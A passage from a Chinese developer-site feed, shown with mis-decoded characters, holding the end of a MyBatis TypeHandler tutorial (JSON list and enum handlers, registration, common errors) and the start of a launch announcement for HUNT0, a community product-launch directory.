        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> GSON.toJson(parameter);
        ps.setString(i, json);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        ResultSet rs, String columnName)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// JSONå­—ç¬¦ä¸² â†’ List&lt;String&gt;</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> rs.getString(columnName);
        <span class="hljs-keyword">return</span> parseJson(json);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        ResultSet rs, <span class="hljs-type">int</span> columnIndex)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> rs.getString(columnIndex);
        <span class="hljs-keyword">return</span> parseJson(json);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(
        CallableStatement cs, <span class="hljs-type">int</span> columnIndex)</span> 
        <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> cs.getString(columnIndex);
        <span class="hljs-keyword">return</span> parseJson(json);
    }

    <span class="hljs-keyword">private</span> List&lt;String&gt; <span class="hljs-title function_">parseJson</span><span class="hljs-params">(String json)</span> {
        <span class="hljs-keyword">if</span> (json == <span class="hljs-literal">null</span> || json.trim().isEmpty()) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        <span class="hljs-keyword">return</span> GSON.fromJson(json, LIST_TYPE);
    }
}
</code></pre>
<h2 data-id="heading-24">æšä¸¾ç±»å‹å¤„ç†</h2>
<p>MyBatisæä¾›äº†ä¸¤ç§æšä¸¾ç±»å‹å¤„ç†å™¨ï¼š</p>
<pre><code class="hljs language-scala" lang="scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EnumTypeHandler&lt;E</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Enum&lt;E&gt;&gt;</span> </span>
    <span class="hljs-keyword">extends</span> <span class="hljs-type">BaseTypeHandler</span>&lt;<span class="hljs-type">E</span>&gt; {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span>&lt;<span class="hljs-type">E</span>&gt; <span class="hljs-class"><span class="hljs-keyword">type</span></span>;

    <span class="hljs-meta">@Override</span>
    public void setNonNullParameter(
        <span class="hljs-type">PreparedStatement</span> ps, int i, 
        <span class="hljs-type">E</span> parameter, <span class="hljs-type">JdbcType</span> jdbcType) 
        <span class="hljs-keyword">throws</span> <span class="hljs-type">SQLException</span> {
        <span class="hljs-comment">// Enum â†’ name (VARCHAR)</span>
        ps.setString(i, parameter.name());
    }

    <span class="hljs-meta">@Override</span>
    public <span class="hljs-type">E</span> getNullableResult(
        <span class="hljs-type">ResultSet</span> rs, <span class="hljs-type">String</span> columnName) 
        <span class="hljs-keyword">throws</span> <span class="hljs-type">SQLException</span> {
        <span class="hljs-comment">// name â†’ Enum</span>
        <span class="hljs-type">String</span> name = rs.getString(columnName);
        <span class="hljs-keyword">return</span> name == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : 
               <span class="hljs-type">Enum</span>.valueOf(<span class="hljs-class"><span class="hljs-keyword">type</span>, <span class="hljs-title">name</span>)</span>;
    }
}
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EnumOrdinalTypeHandler&lt;E</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Enum&lt;E&gt;&gt;</span> </span>
    <span class="hljs-keyword">extends</span> <span class="hljs-type">BaseTypeHandler</span>&lt;<span class="hljs-type">E</span>&gt; {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span>&lt;<span class="hljs-type">E</span>&gt; <span class="hljs-class"><span class="hljs-keyword">type</span></span>;

    <span class="hljs-meta">@Override</span>
    public void setNonNullParameter(
        <span class="hljs-type">PreparedStatement</span> ps, int i, 
        <span class="hljs-type">E</span> parameter, <span class="hljs-type">JdbcType</span> jdbcType) 
        <span class="hljs-keyword">throws</span> <span class="hljs-type">SQLException</span> {
        <span class="hljs-comment">// Enum â†’ ordinal (INTEGER)</span>
        ps.setInt(i, parameter.ordinal());
    }

    <span class="hljs-meta">@Override</span>
    public <span class="hljs-type">E</span> getNullableResult(
        <span class="hljs-type">ResultSet</span> rs, <span class="hljs-type">String</span> columnName) 
        <span class="hljs-keyword">throws</span> <span class="hljs-type">SQLException</span> {
        <span class="hljs-comment">// ordinal â†’ Enum</span>
        int ordinal = rs.getInt(columnName);
        <span class="hljs-keyword">if</span> (ordinal == <span class="hljs-number">0</span> &amp;&amp; rs.wasNull()) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        <span class="hljs-type">E</span>[] enums = <span class="hljs-keyword">type</span>.getEnumConstants();
        <span class="hljs-keyword">return</span> enums[ordinal];
    }
}
</code></pre>
<h2 data-id="heading-25">æ³¨å†Œè‡ªå®šä¹‰TypeHandlerçš„ä¸‰ç§æ–¹å¼</h2>
<pre><code class="hljs language-xml" lang="xml">@MappedTypes(List.class)
@MappedJdbcTypes(JdbcType.VARCHAR)
public class JsonListTypeHandler 
    extends BaseTypeHandler&lt;List<span class="hljs-tag">&lt;<span class="hljs-name">String</span>&gt;</span>&gt; {
    // å®ç°ä»£ç ...
}
<span class="hljs-tag">&lt;<span class="hljs-name">typeHandlers</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- æŒ‡å®šç±»å --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">typeHandler</span> 
        <span class="hljs-attr">handler</span>=<span class="hljs-string">"com.example.JsonListTypeHandler"</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- æŒ‡å®šJavaç±»å‹å’ŒJDBCç±»å‹ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">typeHandler</span> 
        <span class="hljs-attr">javaType</span>=<span class="hljs-string">"java.util.List"</span>
        <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">"VARCHAR"</span>
        <span class="hljs-attr">handler</span>=<span class="hljs-string">"com.example.JsonListTypeHandler"</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- åŒ…æ‰«æ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"com.example.typehandler"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">typeHandlers</span>&gt;</span>
@Configuration
public class MyBatisConfig {
    @Bean
    public ConfigurationCustomizer 
        configurationCustomizer() {
        return configuration -&gt; {
            TypeHandlerRegistry registry = 
                configuration.getTypeHandlerRegistry();
            registry.register(
                List.class, 
                JdbcType.VARCHAR, 
                new JsonListTypeHandler()
            );
        };
    }
}
</code></pre>
<h2 data-id="heading-26">å…«ã€æœ€ä½³å®è·µ</h2>
<h2 data-id="heading-27">é—®é¢˜1ï¼šç±»å‹è½¬æ¢å¼‚å¸¸</h2>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span> é—®é¢˜ï¼šCannot <span class="hljs-keyword">convert</span> <span class="hljs-keyword">value</span> <span class="hljs-string">'0000'</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">column</span> <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-type">TIMESTAMP</span>
<span class="hljs-operator">/</span><span class="hljs-operator">/</span> åŸå› ï¼šæ—¥æœŸæ ¼å¼ä¸åŒ¹é…
<span class="hljs-operator">/</span><span class="hljs-operator">/</span> è§£å†³ï¼šä½¿ç”¨æ­£ç¡®çš„æ—¥æœŸç±»å‹æˆ–è‡ªå®šä¹‰TypeHandler
</code></pre>
<h2 data-id="heading-28">é—®é¢˜2ï¼šNullå€¼å¤„ç†</h2>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// é—®é¢˜ï¼šJDBC requires that the JdbcType must be specified</span>
<span class="hljs-comment">// è§£å†³1ï¼šæŒ‡å®šjdbcType</span>
<span class="hljs-meta">#{name, jdbcType=VARCHAR}</span>

<span class="hljs-comment">// è§£å†³2ï¼šå…¨å±€é…ç½®</span>
&lt;setting name=<span class="hljs-string">"jdbcTypeForNull"</span> <span class="hljs-keyword">value</span>=<span class="hljs-string">"NULL"</span>/&gt;
</code></pre>
<h2 data-id="heading-29">é—®é¢˜3ï¼šæšä¸¾ç±»å‹å¤„ç†</h2>
<pre><code class="hljs language-ini" lang="ini">// é…ç½®é»˜è®¤æšä¸¾å¤„ç†å™¨
&lt;settings&gt;
    &lt;setting <span class="hljs-attr">name</span>=<span class="hljs-string">"defaultEnumTypeHandler"</span> value=<span class="hljs-string">"org.apache.ibatis.type.EnumTypeHandler"</span>/&gt;
&lt;/settings&gt;

// æˆ–åœ¨ResultMapä¸­æŒ‡å®š
&lt;result <span class="hljs-attr">column</span>=<span class="hljs-string">"status"</span> property=<span class="hljs-string">"status"</span>
         <span class="hljs-attr">typeHandler</span>=<span class="hljs-string">"org.apache.ibatis.type.EnumOrdinalTypeHandler"</span>/&gt;
</code></pre>
<h2 data-id="heading-30">ä¹ã€æ€»ç»“</h2>
<p>MyBatisçš„ç±»å‹å¤„ç†æ¨¡å—æ˜¯æ•´ä¸ªæ¡†æ¶çš„åŸºç¡€ç»„ä»¶ï¼Œé€šè¿‡ç²¾å¿ƒè®¾è®¡çš„TypeHandlerä½“ç³»ï¼Œå®ç°äº†Javaç±»å‹ä¸JDBCç±»å‹çš„æ— ç¼è½¬æ¢ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HUNT0 ä¸Šçº¿äº†â€”â€”å°½æ—©å‘å¸ƒï¼Œå°½æ—©å‘ç°]]></title>    <link>https://juejin.cn/post/7589893746081005609</link>    <guid>https://juejin.cn/post/7589893746081005609</guid>    <pubDate>2026-01-01T16:07:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893746081005609" data-draft-id="7589838742552821779" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HUNT0 ä¸Šçº¿äº†â€”â€”å°½æ—©å‘å¸ƒï¼Œå°½æ—©å‘ç°"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-01T16:07:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Justin3go"/> <meta itemprop="url" content="https://juejin.cn/user/220366354020749"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HUNT0 ä¸Šçº¿äº†â€”â€”å°½æ—©å‘å¸ƒï¼Œå°½æ—©å‘ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/220366354020749/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Justin3go
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T16:07:43.000Z" title="Thu Jan 01 2026 16:07:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">HUNT0 ä¸Šçº¿äº†â€”â€”å°½æ—©å‘å¸ƒï¼Œå°½æ—©å‘ç°</h2>
<blockquote>
<p>âœ¨æ–‡ç« æ‘˜è¦ï¼ˆAIç”Ÿæˆï¼‰</p>
</blockquote>

<blockquote>
</blockquote>
<p>HUNT0 æ˜¯ä¸€ä¸ªé¢å‘ maker å’Œ indie hacker çš„ç¤¾åŒºé©±åŠ¨å‘å¸ƒç›®å½•ï¼Œæƒ³æŠŠâ€œå‘å¸ƒâ€å˜æˆä¸€ä»¶æœ‰ä»ªå¼æ„Ÿã€å¯è¢«å‘ç°ã€å¯è·å¾—åé¦ˆçš„äº‹ï¼šä½ å¯ä»¥é¢„çº¦å‘å¸ƒæ—¥æœŸï¼Œé€šè¿‡å£°æœ›åŠ æƒæŠ•ç¥¨ä¸è¯„è®ºæ‹¿åˆ°æ—©æœŸåé¦ˆï¼Œå†é€šè¿‡æ¦œå•ä¸ Exploreï¼ˆæŒ‰ç­›é€‰æ„å›¾ç»„ç»‡ï¼‰å¿«é€Ÿå‘ç°å€¼å¾—å…³æ³¨çš„æ–°äº§å“ã€‚</p>
<blockquote>
</blockquote>
<p>v1.0.0 å…ˆæŠŠæ ¸å¿ƒé—­ç¯è·‘é€šï¼š<strong>launch â†’ discover â†’ vote â†’ discuss â†’ recap/reward</strong>ã€‚æˆ‘ä»¬åšäº†å®æ—¶åŒæ­¥æŠ•ç¥¨çŠ¶æ€ã€ç»“æ„åŒ–çš„æäº¤æµç¨‹ï¼ˆå…è´¹æ’é˜Ÿ + Premium Launchï¼‰ã€ä»¥åŠæé†’/å¥–é¡¹ç­‰è‡ªåŠ¨åŒ–æœºåˆ¶ï¼Œç›®æ ‡æ˜¯å‡å°‘å™ªéŸ³ï¼Œè®©æ—©æœŸå‘ç°æ›´â€œæœ‰ç« å¯å¾ªâ€ã€‚</p>
<blockquote>
</blockquote>

<blockquote>
<p>ä¸€åˆ‡éƒ½å§‹äºä¸€å¼ æœ‰ç‚¹â€œä¸‘â€çš„è‰å›¾ï¼šä¸€æŠŠå‘å‰å€¾æ–œçš„æ¢¯å­ã€‚</p>
</blockquote>
<p>è¿™å¼ æ¢¯å­è‰å›¾æœ€ç»ˆæˆä¸ºäº† HUNT0 çš„ logoã€‚å®ƒæé†’æˆ‘ä»¬ï¼šè¿›æ­¥æ˜¯ä¸€æ ¼ä¸€æ ¼çˆ¬å‡ºæ¥çš„â€”â€”ä¸å…¶ç­‰å®Œç¾ï¼Œä¸å¦‚å…ˆæŠŠä¸å®Œç¾çš„ä¸œè¥¿å‘å‡ºå»ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/614143c05b694d98a8a9d1b5eb7e7812~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVzdGluM2dv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767888462&amp;x-signature=PWzncfdfHhQfwrgJXA57Deo3GQU%3D" alt="é‚£å¼ åæ¥å˜æˆ HUNT0 logo çš„åŸå§‹æ¢¯å­è‰å›¾" loading="lazy"/></p>
<p>è¿™ä¹Ÿæ˜¯å£å· <strong>â€œShip Early, Hunt Earlyâ€</strong> çš„ç”±æ¥ï¼šåˆ›ä½œè€…å°½æ—©å‘å¸ƒï¼Œç¤¾åŒºæ‰èƒ½å°½æ—©å‘ç°â€”â€”å»æµè§ˆã€æŠ•ç¥¨ã€è®¨è®ºï¼Œå¸®åŠ©å¥½äº§å“æ‰¾åˆ°ç¬¬ä¸€æ‰¹ç”¨æˆ·ã€‚</p>
<p>å¦‚æœä½ åœ¨å…¬å¼€æ„å»ºï¼ˆbuild in publicï¼‰ï¼Œæ¬¢è¿æ¥è¿™é‡Œå‘å¸ƒï¼›å¦‚æœä½ å–œæ¬¢æ¢ç´¢æ–°ä¸œè¥¿ï¼Œå°±ä»â€œhuntâ€å¼€å§‹ã€‚</p>
<h3 data-id="heading-1">ä»€ä¹ˆæ˜¯ HUNT0ï¼Ÿ</h3>
<p>HUNT0 æ˜¯ä¸€ä¸ªç¤¾åŒºé©±åŠ¨çš„å‘å¸ƒç›®å½•ï¼Œè®©â€œå‘å¸ƒâ€å’Œâ€œå‘ç°â€åŒé¢‘å‘ç”Ÿï¼š</p>
<ul>
<li>é¢„çº¦å‘å¸ƒæ—¥æœŸï¼ŒæŠŠå‘å¸ƒå˜æˆä¸€ä»¶æ˜ç¡®çš„äº‹ä»¶</li>
<li>é€šè¿‡æŠ•ç¥¨ä¸è¯„è®ºè·å¾—æ—©æœŸåé¦ˆ</li>
<li>ç”¨æ¦œå•ä¸ Explore æŒ‰æ—¶é—´ä¸å…´è¶£ç»„ç»‡â€œæ–°äº§å“â€ï¼Œè€Œä¸æ˜¯æŒ‰å™ªéŸ³æ’åº</li>
</ul>
<h3 data-id="heading-2">ä¸Šçº¿ v1.0.0ï¼šæˆ‘ä»¬åšäº†ä»€ä¹ˆ</h3>
<p>v1.0.0 å…ˆèšç„¦åœ¨æ ¸å¿ƒé—­ç¯ï¼š<strong>launch â†’ discover â†’ vote â†’ discuss â†’ recap/reward</strong>ã€‚</p>
<h4 data-id="heading-3">1ï¼‰é¦–é¡µæ¦œå•ï¼šâ€œä»Šå¤©è¯¥çœ‹ä»€ä¹ˆï¼Ÿâ€</h4>
<p>é¦–é¡µæŒ‰æ—¶é—´çª—å£ç»„ç»‡ï¼Œæ–¹ä¾¿ä½ å¿«é€Ÿæ‰«åˆ°å€¼å¾—å…³æ³¨çš„å†…å®¹ï¼š</p>
<ul>
<li><strong>Top Products Launching Today</strong>ï¼šä»Šå¤©ï¼ˆUTCï¼‰å‘å¸ƒçš„äº§å“</li>
<li><strong>Yesterday / This Week / This Month</strong>ï¼šæŒ‰æ›´é•¿æ—¶é—´çª—å£å›é¡¾</li>
</ul>
<p>æŠ•ç¥¨çŠ¶æ€ä¼šåœ¨é¡µé¢å†… <strong>å®æ—¶åŒæ­¥</strong>ï¼šä½ åœ¨ä»»æ„ä½ç½®ç»™æŸä¸ªäº§å“æŠ•ç¥¨ï¼Œé¡µé¢ä¸Šçš„æ‰€æœ‰å®ä¾‹ä¼šç«‹åˆ»ä¸€èµ·æ›´æ–°ï¼Œæ— éœ€åˆ·æ–°ã€‚</p>
<h4 data-id="heading-4">2ï¼‰Exploreï¼šæŒ‰æ„å›¾ç­›é€‰ï¼Œè€Œä¸æ˜¯é è¿æ°”</h4>
<p>Explore æ”¯æŒ <strong>åˆ†ç±»ã€æ ‡ç­¾ï¼ˆæœ€å¤š 10 ä¸ªï¼‰ã€æ—¶é—´èŒƒå›´ã€å…¨æ–‡æœç´¢</strong>ï¼Œå¹¶æ”¯æŒåˆ†é¡µã€‚</p>
<p>åœ¨ç›¸åŒç­›é€‰æ¡ä»¶ä¸‹ï¼Œ<strong>Premium Launch</strong> ä¼šåœ¨æ’åºä¸Šä¼˜å…ˆäºå…è´¹å‘å¸ƒâ€”â€”åœ¨â€œæ›´éœ€è¦æ›å…‰â€çš„æ—¶åˆ»æ›´æœ‰æ•ˆã€‚</p>
<h4 data-id="heading-5">3ï¼‰äº§å“é¡µï¼šå±•ç¤ºã€è®¿é—®ã€è®¨è®ºä¸€ç«™å¼</h4>
<p>æ¯ä¸ªäº§å“éƒ½æœ‰ç‹¬ç«‹è¯¦æƒ…é¡µï¼Œä¾¿äºæ›´æ·±å…¥åœ°äº†è§£ä¸äº’åŠ¨ï¼š</p>
<ul>
<li>æ ¸å¿ƒä¿¡æ¯ä¸å¤–é“¾ï¼ˆVisitï¼‰</li>
<li>æˆªå›¾ç”»å»Šä¸æ›´é•¿çš„äº§å“ä»‹ç»ï¼ˆAboutï¼‰</li>
<li>å£°æœ›åŠ æƒçš„æŠ•ç¥¨ä¸è¯„è®º</li>
<li>æ¦œå•/å¥–é¡¹å¾½ç« ï¼ˆä¾‹å¦‚æ—¥æ¦œ/å‘¨æ¦œ/æœˆæ¦œ Top 3ï¼‰</li>
</ul>
<h4 data-id="heading-6">4ï¼‰æäº¤ï¼šå…è´¹æ’é˜Ÿ + Premium Launch</h4>
<p>æˆ‘ä»¬æŠŠâ€œå‘å¸ƒâ€è®¾è®¡æˆä¸€ä¸ªå¯æ§æµç¨‹ï¼Œè€Œä¸åªæ˜¯è´´ä¸ªé“¾æ¥ï¼š</p>
<ul>
<li><strong>Free Launch</strong>ï¼šæ¯æ—¥å®¹é‡æœ‰é™ï¼ˆé»˜è®¤ <strong>10 ä¸ªåé¢/å¤©</strong>ï¼‰</li>
<li><strong>Premium Launch</strong>ï¼šé€šè¿‡ Stripe Checkout ä»˜è´¹ï¼Œè·å¾—æ›´å¼ºæ›å…‰</li>
</ul>
<p>å¦‚æœ Premium æœªå®Œæˆæ”¯ä»˜ï¼Œæäº¤ä¼šä»¥è‰ç¨¿å½¢æ€ä¿ç•™åœ¨ä½ çš„ dashboardï¼Œä¸ä¼šå…¬å¼€å±•ç¤ºï¼Œç›´åˆ°æ”¯ä»˜æˆåŠŸã€‚</p>
<p>æäº¤ä¹Ÿæ”¯æŒæ›´ä¸°å¯Œçš„å±•ç¤ºä¿¡æ¯ï¼š</p>
<ul>
<li>æœ€å¤š 3 ä¸ªåˆ†ç±»</li>
<li>æœ€å¤š 10 ä¸ªæ ‡ç­¾</li>
<li>è”ç³»æ–¹å¼/ç¤¾äº¤é“¾æ¥ï¼ˆè‡³å°‘ 1 ä¸ªï¼‰</li>
<li>logo ä¸æˆªå›¾ï¼Œè®©äº§å“é¡µæ›´å®Œæ•´</li>
</ul>
<h3 data-id="heading-7">å£°æœ›ç³»ç»Ÿï¼šè®©è´¡çŒ®â€œæœ‰åˆ†é‡â€</h3>
<p>æŠ•ç¥¨ä¸æ˜¯å›ºå®šçš„ä¸€äººä¸€ç¥¨ã€‚HUNT0 ä½¿ç”¨ <strong>Reputation â†’ Level â†’ Vote Weight</strong>ï¼š</p>
<ul>
<li>é€šè¿‡å‚ä¸è·å¾—å£°æœ›ï¼ˆæ¯æ—¥è®¿é—®ã€æŠ•ç¥¨ã€è¯„è®ºã€å‘å¸ƒï¼‰</li>
<li>ç­‰çº§è¶Šé«˜ï¼ŒæŠ•ç¥¨æƒé‡è¶Šå¤§</li>
<li>æ¦œå•æŒ‰åŠ æƒæŠ•ç¥¨èšåˆï¼Œæ›´å¤šåæ˜ å¯ä¿¡è´¡çŒ®è€…çš„åå¥½</li>
</ul>
<p>å®ƒæ—¢æ˜¯æ¿€åŠ±æœºåˆ¶ï¼Œä¹Ÿæ˜¯åœ¨æ—©æœŸç¤¾åŒºé‡Œå‡å°‘å™ªéŸ³çš„å®ç”¨æ‰‹æ®µã€‚</p>
<h3 data-id="heading-8">æé†’ä¸å¥–é¡¹ï¼šæŠŠå‘å¸ƒå½“æˆâ€œäº‹ä»¶â€</h3>
<p>ä¸ºäº†è®©å‘å¸ƒæ›´æœ‰â€œæ—¶åˆ»æ„Ÿâ€ï¼Œæˆ‘ä»¬åŠ äº†ä¸€äº›è‡ªåŠ¨åŒ–ï¼š</p>
<ul>
<li><strong>å‘å¸ƒæé†’é‚®ä»¶</strong>ï¼šåœ¨ UTC å‘å¸ƒæ—¥å¼€å§‹å‰ 1 å°æ—¶å‘é€</li>
<li><strong>æ—¥æ¦œ/å‘¨æ¦œ/æœˆæ¦œå¥–é¡¹</strong>ï¼šè‡ªåŠ¨è®¡ç®— Top 3 å¹¶é€šçŸ¥åˆ›ä½œè€…ï¼ˆå¯é€‰å…¬å¼€å¤ç›˜ï¼‰</li>
</ul>
<h3 data-id="heading-9">å¼€å§‹ä½¿ç”¨</h3>
<ul>
<li>å¦‚æœä½ æ˜¯åˆ›ä½œè€…ï¼šå» <a href="https://link.juejin.cn?target=https%3A%2F%2Fhunt0.com%2Fsubmit" target="_blank" title="https://hunt0.com/submit" ref="nofollow noopener noreferrer">Submit</a> é¢„çº¦å‘å¸ƒæ—¥æœŸ</li>
